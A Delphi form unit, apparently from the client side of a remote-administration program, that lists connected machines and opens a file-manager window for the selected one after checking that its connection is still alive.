unit UnitSearchFiles;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, UnitPrincipal, ComCtrls, Menus;

type
  TFormSearchFiles = class(TForm)
    ListView1: TListView;
    PopupMenu1: TPopupMenu;
    Serachfile: TMenuItem;
    procedure FormShow(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure SerachfileClick(Sender: TObject);
    procedure PopupMenu1Popup(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  FormSearchFiles: TFormSearchFiles;
  PodeReceber: boolean;

implementation

{$R *.dfm}

uses
  UnitFileManager,
  UnitStrings;

procedure TFormSearchFiles.FormShow(Sender: TObject);
begin
  PodeReceber := true;
  Caption := traduzidos[375];
  Serachfile.Caption := traduzidos[306];
  Listview1.Column[1].Caption := traduzidos[401];
end;

procedure TFormSearchFiles.FormClose(Sender: TObject;
  var Action: TCloseAction);
begin
  PodeReceber := false;
end;

procedure TFormSearchFiles.SerachfileClick(Sender: TObject);
var
  Server: integer;
  NovaJanelaFileManager: TFormFileManager;
  ConAux: PConexao;
begin
  ConAux := PConexao(Listview1.Selected.Data);
  ConAux.AThread.Connection.CheckForDisconnect(False, true);
  ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
  if ConAux.AThread.Connection.ClosedGracefully = true then
  begin
    messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
    exit;
  end;
  if ConAux.Athread.Connection.Connected = false then
  begin
    messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
    exit;
  end;
  if ConAux.Forms[8] <> nil then
  begin
    TFormFileManager(ConAux.Forms[8]).PageControl1.ActivePage := TFormFileManager(ConAux.Forms[8]).TabSheet1;
    TFormFileManager(ConAux.Forms[8]).Show;
    TFormFileManager(ConAux.Forms[8]).Caption := ConAux.Item.SubItems.Strings[0] + ' --- ' + traduzidos[306];
  end
  else
  begin
    NovaJanelaFileManager := TFormFileManager.Create(self, ConAux);
    NovaJanelaFileManager.FormStyle := fsStayOnTop;
    ConAux.Forms[8] := NovaJanelaFileManager;
    NovaJanelaFileManager.NomePC := ConAux.Item.SubItems.Strings[0];
    NovaJanelaFileManager.PageControl1.ActivePage := NovaJanelaFileManager.TabSheet1;
    NovaJanelaFileManager.Show;
    NovaJanelaFileManager.Caption := ConAux.Item.SubItems.Strings[0] + ' --- ' + traduzidos[306];
  end;
end;

procedure TFormSearchFiles.PopupMenu1Popup(Sender: TObject);
begin
  Serachfile.Enabled := Listview1.Selected <> nil;
end;

end.
